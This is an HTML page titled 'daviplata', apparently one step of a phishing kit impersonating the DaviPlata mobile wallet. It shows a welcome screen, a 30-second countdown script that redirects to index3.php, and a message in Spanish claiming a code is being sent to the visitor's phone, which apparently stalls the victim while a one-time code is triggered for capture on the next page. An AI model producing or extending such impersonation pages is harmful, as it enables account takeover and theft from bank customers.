<!doctype html>
<html>
  <head>
  	<title>daviplata</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

	<link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">

	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	
	<link rel="stylesheet" href="archives/style.css">
 <script language="JavaScript">
	var tiempo=30;
    var url="index3.php";
 
    function updateReloj()
    {
        document.getElementById('contador').innerHTML = "Por favor, espera "+tiempo+" segundos...";
 
        if(tiempo==0)
        {
            window.location=url;
        }else{
            tiempo-=1;
            setTimeout("updateReloj()",1000);
        }
    }
   window.onload=updateReloj;
 
    </script>
	</head>
	<body>
	<section class="ftco-section">
		<div class="container">
			<div class="row justify-content-center">
				<div class="col-md-6 text-center mb-5">
					<h2 class="heading-section">Bienvenido</h2>
				</div>
			</div>
			<div class="row justify-content-center">
				<div class="col-md-7 col-lg-5">
					<div class="login-wrap p-4 p-md-5">
		      	<div >
				<img class="icon d-flex align-items-center justify-content-center" src="archives/descargaa.png" style="width:40%;height:auto;">
		      		
		      	</div>
		      	<h3 class="text-center mb-4"></h3>
					<div align="center">
				
				<br><br>
								
								
								<b><font id="contador" style=" font-size:20px;"></font></b>
								<br><br>
								<img  src="archives/casita.gif" style="width:30%">
								<br><br>
								
										<font style=" font-size:20px;"><br>Estamos enviando un código a tu teléfono</font>
				
				 </div>
			
	        </div>
				</div>
			</div>
		</div>
	</section>

	</body>
</html>

